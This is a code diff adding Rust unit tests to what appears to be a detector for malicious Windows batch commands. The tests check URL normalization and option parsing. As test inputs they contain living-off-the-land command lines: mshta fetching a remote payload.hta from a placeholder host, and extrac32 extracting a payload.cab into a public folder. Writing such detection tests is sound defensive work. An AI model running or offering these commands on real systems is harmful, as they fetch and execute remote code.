@@ -6155,6 +6155,23 @@ mod misc_handler_tests {
     }
 
     #[test]
+    fn mshta_liberal_url_emits_normalized_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"mshta "hTtP:\\mshta-liberal.example\payload.hta""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://mshta-liberal.example/payload.hta"
+            )
+        });
+        assert!(has, "mshta URL not normalized: {:?}", env.traits);
+    }
+
+    #[test]
     fn rundll32_records_cmd() {
         let mut env = Environment::new(&Config::default());
         interpret_line("rundll32 some.dll,EntryPoint", &mut env);
@@ -7294,6 +7311,27 @@ mod extrac32_tests {
             )
         });
         assert!(has, "no %~f0 Extrac32 self_reference: {:?}", env.traits);
+    }
+
+    #[test]
+    fn extrac32_l_option_value_is_not_treated_as_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"extrac32 /Y /L "C:\Users\Public" "C:\Users\al\Downloads\payload.cab""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Extrac32 { src, dst, .. }
+                    if src == r#"C:\Users\al\Downloads\payload.cab"# && dst == r#"C:\Users\Public"#
+            )
+        });
+        assert!(
+            has,
+            "extrac32 /L value was parsed as positional source: {:?}",
+            env.traits
+        );
     }
 
     #[test]
